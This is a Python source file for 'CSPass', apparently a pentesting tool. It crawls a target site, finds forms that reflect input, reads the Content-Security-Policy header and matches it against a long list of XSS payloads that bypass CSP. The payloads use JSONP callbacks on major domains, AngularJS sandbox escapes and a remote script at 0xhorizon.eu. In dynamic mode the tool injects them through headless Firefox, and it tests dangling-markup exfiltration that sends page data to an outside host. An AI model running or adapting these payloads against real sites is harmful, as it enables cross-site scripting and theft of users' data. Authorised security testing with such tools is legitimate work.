#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : @Ruulian_
# Date created       : 31 Oct 2021

from random import choice
from requests_html import HTMLSession
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from urllib.parse import urljoin, urlparse
import argparse
import datetime
import json
import platform
import re
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

color = choice([35, 93, 33])

nonce_reg = r'nonce\-(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
sha_reg = r'sha\d{3}\-(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'

general_payload = "alert()"

policies_fallback = {
    "script-src":"default-src"
}

vulnerable_CSP_conf = {
    "script-src" : [
        {'value': ['unsafe-inline'], 'patch':[('script-src', nonce_reg), ('script-src', sha_reg)], 'payload': f'<script>{general_payload}</script>'},
        {'value': ['unsafe-inline'], 'patch':[('script-src', nonce_reg), ('script-src', sha_reg)], 'payload': f'<img src=# onerror={general_payload}>'},
        {'value': ['*'], 'patch':[], 'payload': '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'},
        {'value': ['data:'], 'patch':[], 'payload': f'<script src="data:,{general_payload}"></script>'},
        {'value':['https://cdnjs.cloudflare.com', 'unsafe-eval'], 'patch':[], 'payload':"<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\"></script><div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };%s;//');}} </div>" % general_payload},
        {'value': ['https://*.google.com'], 'patch':[], 'payload': f'"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback={general_payload}"></script>'},
        {'value': ['https://*.doubleclick.net'], 'patch':[], 'payload': f'"><script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback={general_payload}"></script>'},
        {'value': ['https://*.googleadservices.com'], 'patch':[], 'payload': f'"><script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback={general_payload}"></script>'},
        {'value': ['https://*.google.com'], 'patch':[], 'payload': f'"><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback={general_payload}"></script>'},
        {'value': ['https://*.google.com'], 'patch':[], 'payload': f'"><script src="https://accounts.google.com/o/oauth2/revoke?callback={general_payload}"></script>'},
        {'value': ['https://*.blogger.com'], 'patch':[], 'payload': f'"><script src="https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback={general_payload}"></script>'},
        {'value': ['https://*.yandex.net'], 'patch':[], 'payload': f'"><script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback={general_payload}"></script>'},
        {'value': ['https://*.yandex.ru'], 'patch':[], 'payload': f'"><script src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback={general_payload}"></script>'},
        {'value': ['https://*.vk.com'], 'patch':[], 'payload': f'"><script src="https://api.vk.com/method/wall.get?callback={general_payload}"></script>'},
        {'value': ['https://*.marketo.com'], 'patch':[], 'payload': f'"><script src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback={general_payload}"></script>'},
        {'value': ['https://*.marketo.com'], 'patch':[], 'payload': f'"><script src="http://app-e.marketo.com/index.php/form/getKnownLead?callback={general_payload}"></script>'},
        {'value': ['https://*.alicdn.com'], 'patch':[], 'payload': f'"><script+src="https://detector.alicdn.com/2.7.3/index.php?callback={general_payload}"></script>'},
        {'value': ['https://*.taobao.com'], 'patch':[], 'payload': f'"><script+src="https://suggest.taobao.com/sug?callback={general_payload}"></script>'},
        {'value': ['https://*.tbcdn.cn'], 'patch':[], 'payload': f'"><script+src="https://count.tbcdn.cn//counter3?callback={general_payload}"></script>'},
        {'value': ['https://*.1688.com'], 'patch':[], 'payload': f'"><script+src="https://bebezoo.1688.com/fragment/index.htm?callback={general_payload}"></script>'},
        {'value': ['https://*.amap.com'], 'patch':[], 'payload': f'"><script+src="https://wb.amap.com/channel.php?callback={general_payload}"></script>'},
        {'value': ['https://*.sm.cn'], 'patch':[], 'payload': f'"><script+src="http://a.sm.cn/api/getgamehotboarddata?format=jsonp&page=1&_=1537365429621&callback={general_payload};jsonp1"></script>'},
        {'value': ['https://*.sm.cn'], 'patch':[], 'payload': f'"><script+src="http://api.m.sm.cn/rest?method=tools.sider&callback=jsonp_1869510867%3b{general_payload}%2f%2f794"></script>'},
        {'value': ['https://*.uber.com'], 'patch':[], 'payload': f'"><script+src="https://mkto.uber.com/index.php/form/getKnownLead?callback={general_payload};"></script>'},
        {'value': ['https://*.buzzfeed.com'], 'patch':[], 'payload': f'"><script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback={general_payload}%2f%2f"></script>'},
        {'value': ['https://*.co.jp'], 'patch':[], 'payload': f'"><script src=https://mempf.yahoo.co.jp/offer?position=h&callback={general_payload}//></script>'},
        {'value': ['https://*.yahooapis.jp'], 'patch':[], 'payload': f'"><script src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback={general_payload}//&appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-></script>'},
        {'value': ['https://*.aol.com'], 'patch':[], 'payload': f'"><script+src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback={general_payload}//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>'},
        {'value': ['https://*.aol.com'], 'patch':[], 'payload': f'"><script+src="https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3b{general_payload}%2f%2f476&_=1537149044679"></script>'},
        {'value': ['https://*.aol.com'], 'patch':[], 'payload': f'"><script+src="https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback={general_payload};//jQuery20108887725116629929_1528071050373472232&_=1528071050374"></script>'},
        {'value': ['https://*.aol.com'], 'patch':[], 'payload': f'"><script+src="https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback={general_payload};//jQuery20108887725116629929_152807105037740504&_=1528071050378"></script>'},
        {'value': ['https://*.yahoo.com'], 'patch':[], 'payload': f'">x<script+src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb={general_payload};"></script>'},
        {'value': ['https://*.yahoo.com'], 'patch':[], 'payload': f'"><script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback={general_payload}"></script>'},
        {'value': ['https://*.aol.com'], 'patch':[], 'payload': f'"><script+src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback={general_payload}//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>'},
        {'value': ['https://*.aol.com'], 'patch':[], 'payload': f'"><script+src="https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooter&channel=finance&portfolios=true&domain=portfolios&collapsed=1&callback={general_payload}//jQuery21307555521146732187_1538371213486&_=1538371213487"></script>'},
        {'value': ['https://*.aol.com'], 'patch':[], 'payload': f'"><script+src="http://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback={general_payload}//jQuery1710788849030856973_1538354104695&_=1538354109053"></script>'},
        {'value': ['https://*.twitter.com'], 'patch':[], 'payload': f'"><script+src="http://search.twitter.com/trends.json?callback={general_payload}"></script>'},
        {'value': ['https://*.twitter.com'], 'patch':[], 'payload': f'"><script+src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback={general_payload}"></script>'},
        {'value': ['https://*.twitter.com'], 'patch':[], 'payload': f'"><script+src="https://twitter.com/status/user_timeline/kbeautysalon.json?count=1&callback={general_payload}"></script>'},
        {'value': ['https://*.sharethis.com'], 'patch':[], 'payload': f'"><script+src="https://www.sharethis.com/get-publisher-info.php?callback={general_payload}"></script>'},
        {'value': ['https://*.addthis.com'], 'patch':[], 'payload': f'"><script+src="https://m.addthis.com/live/red_lojson/100eng.json?callback={general_payload}"></script>'},
        {'value': ['https://*.ngs.ru'], 'patch':[], 'payload': f'"><script+src="https://passport.ngs.ru/ajax/check?callback={general_payload}"></script>'},
        {'value': ['https://*.ulogin.ru'], 'patch':[], 'payload': f'"><script+src="https://ulogin.ru/token.php?callback={general_payload}"></script>'},
        {'value': ['https://*.meteoprog.ua'], 'patch':[], 'payload': f'"><script+src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback={general_payload}"></script>'},
        {'value': ['https://*.intuit.com'], 'patch':[], 'payload': f'"><script+src="https://appcenter.intuit.com/Account/LogoutJSONP?callback={general_payload}"></script>'},
        {'value': ['https://*.userlike.com'], 'patch':[], 'payload': f'"><script+src="https://api.userlike.com/api/chat/slot/proactive/?callback={general_payload}"></script>'},
        {'value': ['https://*.youku.com'], 'patch':[], 'payload': f'"><script+src="https://www.youku.com/index_cookielist/s/jsonp?callback={general_payload}"></script>'},
        {'value': ['https://*.mixpanel.com'], 'patch':[], 'payload': f'"><script+src="https://api.mixpanel.com/track/?callback={general_payload}"></script>'},
        {'value': ['https://*.travelpayouts.com'], 'patch':[], 'payload': f'"><script+src="https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback={general_payload}"></script>'},
        {'value': ['https://*.pictela.net'], 'patch':[], 'payload': f'"><script+src="http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback={general_payload};/json"></script>'},
        {'value': ['https://*.adtechus.com'], 'patch':[], 'payload': f'"><script+src="https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback={general_payload};//window.proper_d31c1edc_57a8d6de_38"></script>'},
        {'value': ['https://*.googleapis.com'], 'patch':[], 'payload': '"><embed src=\'//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain="})))}catch(e){%s}//\' allowscriptaccess=always>' % general_payload},
        {'value': ['https://*.googleapis.com'], 'patch':[], 'payload': f'"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>'},
        {'value': ['https://*.googleapis.com'], 'patch':[], 'payload': f'ng-app"ng-csp ng-click=$event.view.{general_payload}><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>'},
        {'value': ['https://*.googleapis.com'], 'patch':[], 'payload': f'<script src=https://www.googleapis.com/customsearch/v1?callback={general_payload}'},
        {'value': ['unsafe-inline', '*'], 'patch':[], 'payload':f"<script>script=document.createElement('script');script.src='//0xhorizon.eu/cspass/exploit.js';window.frames.document.head.appendChild(script);</script>"}
    ]
}

def date_formatted():
    return datetime.datetime.now().strftime("%H:%M:%S")

def parse_cookies(arg:str):
    cookies = {}
    cookies_arg = arg.split(";")
    for c in cookies_arg:
        cookie = c.split("=")
        try:
            cookies[cookie[0]] = cookie[1]
        except IndexError:
            raise argparse.ArgumentTypeError("Cookies must be specified with key=value")
    return cookies


class Scanner:
    def __init__(self, target, no_colors=False, dynamic=False, all_pages=False, cookies={}, secure=False):
        self.no_colors = no_colors
        self.all_pages = all_pages
        self.dynamic = dynamic
        self.target = target
        self.secure = secure
        self.pages = [self.target]
        self.cookies = cookies
        self.sess = HTMLSession()

    def print(self, message=""):
        if self.no_colors:
            message = re.sub("\x1b[\[]([0-9;]+)m", "", message)
        print(message)

    def succeed(self, message=""):
        self.print(f"[\x1b[92mSUCCEED\x1b[0m] {message}")

    def info(self, message=""):
        self.print(f"[\x1b[96m{date_formatted()}\x1b[0m] {message}")
    
    def vuln(self, message=""):
        self.print(f"[\x1b[93mVULN\x1b[0m] {message}")

    def fail(self, message=""):
        self.print(f"[\x1b[95mFAIL\x1b[0m] {message}")

    def error(self, message=""):
        self.print(f"[\x1b[91mERROR\x1b[0m] {message}")

    def banner(self):
        self.print(f"""\x1b[{color}m
           ______ _____  ____                    
          / ____// ___/ / __ \ ____ _ _____ _____
         / /     \__ \ / /_/ // __ `// ___// ___/
        / /___  ___/ // ____// /_/ /(__  )(__  ) 
        \____/ /____//_/     \__,_//____//____/\x1b[0m\x1b[3m by Ruulian\x1b[0m

        \x1b[4mVersion\x1b[0m: 1.2                                                     
        """)

    def ping(self):
        try:
            r = self.sess.get(self.target, cookies=self.cookies, verify=self.secure)
            r.raise_for_status()
        except OSError:
            return False
        return True

    def get_all_pages(self, page):
        r = self.sess.get(page, cookies=self.cookies)
        if r.text != "":
            links = r.html.absolute_links
            for link in links:
                if link not in self.pages and urlparse(link).netloc == urlparse(self.target).netloc:
                    self.pages.append(link)
                    time.sleep(0.3)
        
class Page:
    def __init__(self, url, cookies, secure=False):
        self.url = url
        self.cookies=cookies
        self.secure = secure
        self.sess = HTMLSession()
        self.csp = self.get_csp()
        self.vulns = []

    def get_csp(self):
        data = {}
        r = self.sess.head(self.url, verify=self.secure)
        if 'Content-Security-Policy' in r.headers.keys():
            csp = r.headers['Content-Security-Policy']
            for param in csp.strip().strip(';').split(';'):
                matched = re.search("^([a-zA-Z0-9\-]+)( .*)?$", param.strip())
                csp_name, csp_values = matched.groups()
                if csp_values is not None:
                    csp_values = [v.rstrip("'").lstrip("'") for v in csp_values.strip().split(' ')]
                else:
                    csp_values = []
                data[csp_name] = csp_values
        return data

    def format_csp(self):
        csp = {}
        for policyname in self.csp:
            csp[policyname] = " ".join(self.csp[policyname])
        csp = json.dumps(
            csp,
            indent=4
        )
        return csp

    def get_forms(self):
        r = self.sess.get(self.url, cookies=self.cookies)
        if r.text != "":
            forms = r.html.find("form")
            return forms
        return []

    def test_patch(self, patches):
        for patch in patches:
            patch_policy_name = patch[0]
            patch_policy_value = patch[1]
            if patch_policy_name in self.csp:
                r = re.compile(patch_policy_value)
                if any([r.match(x) for x in self.csp[patch_policy_name]]):
                    return True
        return False

    def scan(self):
        vuln = False
        csp_keys = self.csp.keys()
        new_csp_keys = []
        for policy, fallback in policies_fallback.items():
            if fallback in csp_keys and policy not in csp_keys:
                new_csp_keys.append((policy, fallback))
            else:
                new_csp_keys.append((policy, policy))

        for policyname in new_csp_keys:
            priority = policyname[0]
            name = policyname[1]
            if priority in vulnerable_CSP_conf.keys():
                for exploit in vulnerable_CSP_conf[priority]:
                    if all(x in self.csp[name] for x in exploit['value']) and (exploit['patch'] == [] or not self.test_patch(exploit['patch'])):
                        policyvalue = " ".join(self.csp[name])
                        self.vulns.append({'value':f"{name} {policyvalue}", 'payload':exploit['payload']})
                        vuln = True
        return vuln
                            
                            
            
class Form:
    def __init__(self, url, action, method, names, cookies, secure=False):
        self.url = url
        self.action = action
        self.method = method
        self.names = names
        self.cookies = cookies
        self.secure = secure
        self.sess = HTMLSession()

    def test_dom(self):
        parameters = {}
        value = "<em>random_value_t0_test</em>"
        
        for name, val in self.names.items():
            if val == "":
                parameters[name] = value
            else:
                parameters[name] = val

        if self.method.lower() == "get":
            r = self.sess.get(self.action, params=parameters, cookies=self.cookies, verify=self.secure)
        elif self.method.lower() == "post":
            r = self.sess.post(self.action, data=parameters, cookies=self.cookies, verify=self.secure)

        if value in r.text:
            return True
        else:
            return False

    def exploit(self, payload, dangling=False):
        domain = urlparse(self.url).netloc
        if platform.system() == "Linux" or platform.system() == "Darwin":
            log_path = "/dev/null"
        else:
            log_path = "NUL"
        options = FirefoxOptions()
        options.add_argument("--headless")
        wb = webdriver.Firefox(options=options, service_log_path=log_path)
        
        wb.get(self.url)
        for key, value in self.cookies.items():
            wb.add_cookie({'name':key, 'value':value, 'domain':domain})
        
        for name in self.names:
            form_input = wb.find_element_by_name(name)
            form_input.clear()
            form_input.send_keys(payload)
        form = wb.find_element_by_tag_name("form")
        form.submit()
        time.sleep(0.5)

        exploit = False
        if dangling:
            if urlparse(wb.current_url).netloc != domain:
                exploit = True
            else:
                exploit = False
        else:
            try:
                WebDriverWait(wb, 3).until(EC.alert_is_present())

                alert = wb.switch_to.alert
                alert.accept()
                exploit = True
            except TimeoutException:
                exploit = False
        wb.close()
        return exploit


def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='CSP Bypass tool')

    parser.add_argument("--no-colors", dest="no_colors", action="store_true", help="Disable color mode")
    parser.add_argument("-d", "--dynamic", dest="dynamic", action="store_true", help="Use dynamic mode")
    parser.add_argument("-a", "--all-pages", dest="all_pages", action="store_true", help="Looking for vulnerability in all pages could be found", required=False)
    parser.add_argument("-k", "--secure", dest="secure", action="store_true", help="Check SSL certificate")

    required_args = parser.add_argument_group("Required argument")
    required_args.add_argument("-t", "--target", dest="target", help="Specify the target url", required=True)

    required_args = parser.add_argument_group("Authentication")
    required_args.add_argument("-c", "--cookies", dest="cookies", help="Specify the cookies (key=value)", type=parse_cookies, required=False, default={})
    
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = parse_args()
    scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic, all_pages=args.all_pages, cookies=args.cookies, secure=args.secure)
    scan.banner()
    scan.info(f"Starting scan on target \x1b[1m{scan.target}\x1b[0m\n")
    
    scan.info("Pinging page")
    if scan.ping():
        scan.info("Page found\n")
    else:
        scan.error("Page not found")
        exit()

    if scan.all_pages:
        scan.info("Detecting all pages...")
        scan.get_all_pages(scan.target)
        scan.info(f"{len(scan.pages)} pages found\n")
    
    for p in scan.pages:
        page = Page(p, scan.cookies, secure=scan.secure)
        scan.info(f"Scanning page: \x1b[1m{page.url}\x1b[0m")
        forms = page.get_forms()
        if forms != []:
            for form in forms:
                if 'action' in form.attrs and form.attrs['action'] != '':
                    action = form.attrs['action']
                else:
                    action = page.url
                if 'method' in form.attrs:
                    method = form.attrs['method']
                else:
                    method = "GET"

                inputs = form.find("input") + form.find("textarea")
                
                names = {}
                for input_tag in inputs:
                    if "name" in input_tag.attrs:
                        name = input_tag.attrs["name"]
                        if "type" in input_tag.attrs and input_tag.attrs["type"] == "hidden":
                            try:
                                names[name] = input_tag.attrs["value"]
                            except:
                                pass
                        else:
                            names[name] = ''

                new_form = Form(page.url, urljoin(page.url, action), method, names, scan.cookies, scan.secure)

                if new_form.test_dom():
                    scan.info("Parameter reflected in DOM and no htmlspecialchars detected")
                    if page.csp != {}:
                        csps = page.format_csp()
                        scan.print()
                        scan.print(f" [\x1b[{color}mContent-Security-Policy\x1b[0m] ".center(74, "="))
                        scan.print(csps)
                        scan.print(f" [\x1b[{color}mContent-Security-Policy\x1b[0m] ".center(74, "="))
                        scan.print()
                        if page.scan():
                            vulns = page.vulns
                            scan.info(f"Number of vulnerabilities found: {len(vulns)}\n")
                            for vuln in vulns:
                                scan.vuln(f"Vulnerability: \x1b[1m{vuln['value']}\x1b[0m")
                                scan.vuln(f"Payload: {vuln['payload']}\n")
                            if scan.dynamic:
                                scan.info(f"Starting dynamic mode ...")
                                for vuln in vulns:
                                    scan.info(f"Testing: \x1b[1m{vuln['value']}\x1b[0m")
                                    if new_form.exploit(vuln['payload']):
                                        scan.succeed(f"Payload found on \x1b[1m{page.url}\x1b[0m")
                                        scan.succeed(f"Payload: {vuln['payload']}\n")
                                    else:
                                        scan.fail("Payload tested didn't work\n")
                        else:
                            scan.fail(f"No XSS found\n")
                        if scan.dynamic:
                            scan.info("Testing Dangling Markup ...")
                            dangling_markup_payload = "<meta http-equiv=\"refresh\" content='0; url=https://0xhorizon.eu?data="
                            if new_form.exploit(dangling_markup_payload, True):
                                scan.succeed(f"Dangling markup payload found: {dangling_markup_payload}\n")
                            else:
                                scan.fail("No dangling markup detected\n")
                        else:
                            scan.info("Perhaps you can exploit Dangling Markup\n")
                    else:
                        scan.fail(f"No CSP on page {page.url}\n")
                else:
                    scan.fail("No parameter reflected in DOM or htmlspecialchars detected\n")
        else:
            scan.fail("No form found on this page\n")

scan.info("Scan finished")
